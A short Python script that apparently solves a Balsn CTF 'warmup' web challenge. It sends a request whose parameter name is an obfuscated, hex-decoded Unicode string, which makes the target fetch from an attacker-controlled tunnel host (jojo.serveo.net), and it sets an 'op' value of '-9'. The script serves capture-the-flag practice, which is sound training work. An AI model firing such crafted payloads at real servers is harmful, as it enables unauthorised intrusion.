import requests

arg = bytes.fromhex('cea3 3ee2 8095  2823 c2b0 cf89 c2b0 2329 e299 a1e2 8692').decode()
#  r = requests.get('http://warmup.balsnctf.com', params={arg: 'http://jojo.serveo.net'})
r = requests.get('http://localhost:8080/pretty2.php', params={
    arg: 'http://jojo.serveo.net',
    'op': '-9'})
print(r.text)

open('result.html', 'wb').write(r.content)
